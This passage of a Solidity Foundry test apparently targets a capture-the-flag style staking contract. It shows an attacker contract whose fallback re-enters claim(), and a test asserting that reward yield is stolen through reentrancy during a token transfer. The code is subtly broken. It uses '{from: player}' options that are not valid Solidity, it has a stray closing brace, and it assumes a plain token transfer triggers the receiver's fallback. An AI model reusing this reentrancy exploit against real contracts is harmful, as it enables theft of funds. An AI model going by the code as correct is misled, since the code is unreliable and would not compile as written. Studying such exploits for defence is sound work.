    bool public called;

    constructor(address _staking) {
        staking = DamnValuableStaking(_staking);
    }

    fallback() external payable {
        if (!called) {
            called = true;
            staking.claim();
        }
    }
}

contract StakingReentrancyTest is Test {
    DamnValuableToken public dvt;
    DamnValuableStaking public staking;
    AttackerContract public attacker;
    address public player = address(0x1);
    uint256 public amount = 1 ether;

    function setUp() public {
        dvt = new DamnValuableToken();
        staking = new DamnValuableStaking(dvt, 1e16); // 1% reward rate
        attacker = new AttackerContract(address(staking));

        // Player stakes tokens
        dvt.approve(address(staking), amount, {from: player});
        staking.stake(amount, {from: player});
        // Let time pass to accrue rewards
        vm.warp(block.timestamp + 1 days);
    }

    function testStakingTransferReentrancy() public {
        uint256 initialAttackerDVT = dvt.balanceOf(address(attacker)); // Should be 0
        uint256 initialPlayerDVT = dvt.balanceOf(player);
        uint256 initialPlayerStaked = staking.balanceOf(player);
        uint256 initialRewards = staking.earned(player);

        // Player transfers staked tokens to attacker contract (triggers reentrancy)
        vm.prank(player);
        staking.transfer(address(attacker), amount / 2);

        // After transfer, attacker contract should have claimed rewards
        assert(attacker.called());

        // Player claims rewards
        uint256 rewards = staking.claim({from: player});

        // Calculate expected rewards: half the staked amount should have accrued for half the time
        // Due to reentrancy, attacker stole some yield, so player gets less than expected
        // We check that rewards are less than what they should be without attack
        uint256 expectedRewardsWithoutAttack = (initialPlayerStaked * 1e16 * 1 days) / (1 ether * 365 days);
        // Since attack happened, rewards should be significantly less
        assertTrue(rewards < expectedRewardsWithoutAttack / 2, "Rewards stolen");

        // Attacker contract balance should have increased by stolen rewards
        uint256 attackerDVTAfter = dvt.balanceOf(address(attacker));
        assertTrue(attackerDVTAfter > 0, "Attacker earned rewards via reentrancy");
    }
}
}

